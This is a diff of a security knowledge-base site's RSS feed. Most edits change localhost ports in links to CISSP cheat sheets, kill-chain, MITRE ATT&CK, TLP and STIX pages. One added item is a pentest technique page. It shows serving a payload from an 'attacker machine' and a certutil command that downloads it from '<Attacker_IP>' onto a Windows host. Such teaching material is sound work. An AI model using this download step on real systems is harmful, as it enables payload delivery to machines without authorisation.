-    &lt;a href=&#34;#domain-4-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930001454.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#domain-4-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930001454.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2&gt;Design Concepts&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;design-concepts&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#design-concepts&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;table&gt;
@@ -4168,10 +4336,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>D5 Identity and Access Management</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d5-identity-and-access-management/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d5-identity-and-access-management/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d5-identity-and-access-management/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d5-identity-and-access-management/</guid>
       <description>
         
         
@@ -4208,7 +4376,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Domain 5 Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;domain-5-cheat-sheet&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#domain-5-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930001549.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#domain-5-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930001549.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2&gt;DR Site Types&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;dr-site-types&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#dr-site-types&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;table&gt;
@@ -4443,10 +4611,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>D6 Security Assessment and Testing</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d6-security-assessment-and-testing/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d6-security-assessment-and-testing/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d6-security-assessment-and-testing/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d6-security-assessment-and-testing/</guid>
       <description>
         
         
@@ -4483,7 +4651,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Domain 6 Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;domain-6-cheat-sheet&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#domain-6-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930001639.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#domain-6-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930001639.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 
       </description>
@@ -4491,10 +4659,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>D7 Security Operations</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d7-security-operations/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d7-security-operations/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d7-security-operations/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d7-security-operations/</guid>
       <description>
         
         
@@ -4531,7 +4699,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Domain 7 Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;domain-7-cheat-sheet&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#domain-7-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930001749.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#domain-7-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930001749.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 
       </description>
@@ -4539,10 +4707,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>D8 Software Development Security</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d8-software-development-security/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d8-software-development-security/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d8-software-development-security/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d8-software-development-security/</guid>
       <description>
         
         
@@ -4579,7 +4747,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Domain 8 Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;domain-8-cheat-sheet&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#domain-8-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930001836.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#domain-8-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930001836.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 
       </description>
@@ -4587,10 +4755,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>[1] Attack Mapping Methodology</title>
-      <link>http://localhost:40231/docs/01_methodology/security-analysis/01-attack-mapping-methodology/</link>
+      <link>http://localhost:1313/docs/01_methodology/security-analysis/01-attack-mapping-methodology/</link>
       <pubDate>Mon, 23 Mar 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/01_methodology/security-analysis/01-attack-mapping-methodology/</guid>
+      <guid>http://localhost:1313/docs/01_methodology/security-analysis/01-attack-mapping-methodology/</guid>
       <description>
         
         
@@ -4633,7 +4801,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;p&gt;In simple terms for a cyber defender it&amp;rsquo;s important to know where exactly in the chain that a threat actor is and take necessary actions to break the chain thereby disrupting the threat actor to achieve their goals.&lt;/p&gt;
 &lt;p&gt;The below image from &lt;a
     href=&#34;https://www.trendmicro.com/en_gb/what-is/cyber-attack/cyber-kill-chain.html&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Trend Micro&amp;rsquo;s blog&lt;/a&gt; explains the Cyber Kill Chain&amp;rsquo;s 7 different stages.
-&lt;img src=&#34;http://localhost:40231/docs/01_methodology/security-analysis/assets/Pasted_image_20260324003052.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/01_methodology/security-analysis/assets/Pasted_image_20260324003052.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;table&gt;
 	&lt;thead&gt;
 			&lt;tr&gt;
@@ -4713,14 +4881,14 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
   &lt;/button&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/security-analysis/assets/Pasted_image_20260325004002.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/security-analysis/assets/Pasted_image_20260325004002.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;h3&gt;2. MITRE ATT&amp;amp;CK&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;2-mitre-attck&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#2-mitre-attck&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;2.1 MITRE ATT&amp;amp;CK Framework&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;21-mitre-attck-framework&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#21-mitre-attck-framework&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;In addition to the Cyber kill chain, the &lt;a
     href=&#34;https://attack.mitre.org/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MITRE ATT&amp;amp;CK&lt;/a&gt; framework dives deep into the &lt;code&gt;tactics&lt;/code&gt;, &lt;code&gt;techniques&lt;/code&gt; and &lt;code&gt;procedures&lt;/code&gt; that can be mapped any ongoing threats. There are 14 different sections that expand into &lt;code&gt;sub techniques&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/security-analysis/assets/Pasted_image_20260325011054.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/security-analysis/assets/Pasted_image_20260325011054.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;In addition to MITRE ATT&amp;amp;CK, the D3FEND framework helps by providing a complementary, defense focused taxonomy that maps concrete countermeasures, techniques, and controls to attacker behaviors making it easier for security teams to design, validate, and communicate mitigations (detection rules, system hardening, isolation mechanisms, and response playbooks) that directly correspond to adversary tactics and techniques.
-&lt;img src=&#34;http://localhost:40231/docs/01_methodology/security-analysis/assets/Pasted_image_20260325010310.png&#34; alt=&#34;697&#34;  loading=&#34;lazy&#34; /&gt;
+&lt;img src=&#34;http://localhost:1313/docs/01_methodology/security-analysis/assets/Pasted_image_20260325010310.png&#34; alt=&#34;697&#34;  loading=&#34;lazy&#34; /&gt;
 Here is an example MITRE ATT&amp;amp;CK Mapping for an attack scenario we&amp;rsquo;ve mentioned earlier in section 1.2.&lt;/p&gt;
 &lt;table&gt;
 	&lt;thead&gt;
@@ -4778,17 +4946,94 @@ Here is an example MITRE ATT&amp;amp;CK Mapping for an attack scenario we&amp;rs
     href=&#34;https://sansorg.egnyte.com/dl/k7gJ2gVBj5&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SANS Industrial Control Systems Cyber Kill Chain White Paper&lt;/a&gt; ICS attacks may have many facets that fall into the attack categories of enabling, initiation or supporting to achive their ultimate effect. The complexity of launching an attack is determined by the security of the system the process being monitored and contrlled, the safety design and controls and the intended impact.&lt;/p&gt;
 &lt;p&gt;In the Stuxnet campaign there is a completed two-stage ICS attack that le to the highly tailored and impactful manipulation of the process to cause physical destruction. The attack is mapped to the &lt;a
     href=&#34;https://www.zscaler.com/resources/security-terms-glossary/what-is-purdue-model-ics-security&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Purdue Model&lt;/a&gt; below;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/security-analysis/assets/Pasted_image_20260325233319.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/security-analysis/assets/Pasted_image_20260325233319.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>[01] CertUtil File Transfer</title>
+      <link>http://localhost:1313/docs/03_techniques/01-using-certutil/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/03_techniques/01-using-certutil/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;March 19, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;01 Hosting file in Attacker Machine&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;01-hosting-file-in-attacker-machine&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#01-hosting-file-in-attacker-machine&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Host your payload in your &lt;code&gt;Pentest&lt;/code&gt; Machine&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python3 -m http.server&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4&gt;02 Download the file in Windows Machine&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;02-download-the-file-in-windows-machine&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#02-download-the-file-in-windows-machine&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;certutil&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-urlcache&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-split&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Attacker_IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;temp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;name&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
 
       </description>
     </item>
     
     <item>
       <title>[03] Threat Communication</title>
-      <link>http://localhost:40231/docs/01_methodology/threat-hunting/03-threat-information-management/</link>
+      <link>http://localhost:1313/docs/01_methodology/threat-hunting/03-threat-information-management/</link>
       <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/01_methodology/threat-hunting/03-threat-information-management/</guid>
+      <guid>http://localhost:1313/docs/01_methodology/threat-hunting/03-threat-information-management/</guid>
       <description>
         
         
@@ -4838,7 +5083,7 @@ Here is an example MITRE ATT&amp;amp;CK Mapping for an attack scenario we&amp;rs
 &lt;p&gt;The primary focus in this context is &lt;strong&gt;intelligence&lt;/strong&gt;, which may encompass elements from multiple classifications listed above. For example, an intelligence report may describe a threat actor leveraging specific Tactics, Techniques, and Procedures (TTPs) to exploit identified weaknesses in target environments—weaknesses that may also exist within your organization’s network or products. In such a scenario, the intelligence contains a combination of information, threats, and weaknesses.&lt;/p&gt;
 &lt;p&gt;Based on this intelligence, the threat hunting team can proactively initiate investigations to identify potential indicators of compromise or ongoing attacks within the environment.&lt;/p&gt;
 &lt;p&gt;Effectively communicating threat intelligence requires adherence to standardized procedures and protocols to ensure proper handling and dissemination. One of the most widely adopted frameworks for this purpose is the Traffic Light Protocol (TLP), which provides a simple and intuitive mechanism for classifying and sharing sensitive information.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260317231522.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260317231522.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;The above image is an example of how Threat Intelligence and Threat Hunting would fit into a cybersecurity operations process. The goal is to make sure that there is a strong feedback loop that flows back as a source into the pipeline.&lt;/p&gt;
 &lt;h5&gt;3.1.1 Traffic Light Protocol&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;311-traffic-light-protocol&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#311-traffic-light-protocol&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;p&gt;The FIRST &lt;strong&gt;Traffic Light Protocol (TLP)&lt;/strong&gt; is a standardized framework used to classify and control the sharing of sensitive information. It helps organizations ensure that threat intelligence and security-related data are disseminated only to appropriate audiences, reducing the risk of unintended exposure.&lt;/p&gt;
@@ -4891,7 +5136,7 @@ Here is an example MITRE ATT&amp;amp;CK Mapping for an attack scenario we&amp;rs
 &lt;/ol&gt;
 &lt;p&gt;The Pyramid of Pain address how difficult it if for attackers to mask certain characteristic during an attack, at the same time it&amp;rsquo;s also difficult to hunt fir defenders. For instance writing a search query in &lt;a
     href=&#34;https://www.splunk.com/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Splunk&lt;/a&gt; to hunt for a specific file has is relatively easy, while it&amp;rsquo;s difficult to define a behaviors and hunt for those. On the other hand, a threat actor can mutate malware resulting in different file signatures, while the behavior of the malware would more or less be the similar to the original.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260318233556.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260318233556.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
 Here is an example of the Pain to attacker, Value to defender outlined.&lt;/p&gt;
 &lt;table&gt;
 	&lt;thead&gt;
@@ -4976,7 +5221,7 @@ A number of these intelligence providers support structured threat intelligence 
     href=&#34;https://oasis-open.github.io/cti-documentation/stix/intro.html&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;STIX&lt;/a&gt; which defines the objects for everything in JSON format, using &lt;a
     href=&#34;https://oasis-open.github.io/cti-documentation/taxii/intro.html&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;TAXII&lt;/a&gt; a Trusted Automated Exchange of Intelligence Information protocol.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260318235614.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260318235614.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;TAXII requires two primary services to support intel sharing&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;Collection - Interface to logical repository of CTI objects&lt;/li&gt;
@@ -4985,7 +5230,7 @@ A number of these intelligence providers support structured threat intelligence 
 &lt;p&gt;In a nutshell STIX Defines what the data looks like, while TAXII Defines how the data is shared.&lt;/p&gt;
 &lt;p&gt;The &lt;a
     href=&#34;https://oasis-open.github.io/cti-stix-visualization/?url=https://raw.githubusercontent.com/oasis-open/cti-stix-visualization/master/test.json&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;STIX Visualizer&lt;/a&gt; allows us to rapidly visualize the STIX objects and their relationships. It consumes a Json object and maps out such that it&amp;rsquo;s easily understandable for humans.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260319000021.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260319000021.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Below is an example STIX JSON object in which a threat actor Disco Team operates primarily in Spanish and they have been known to steal credit card information for financial gain.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
 
@@ -5089,7 +5334,7 @@ Here’s a simple &lt;strong&gt;list of disclosure types&lt;/strong&gt;:&lt;/p&g
 &lt;/table&gt;
 &lt;p&gt;The &lt;a
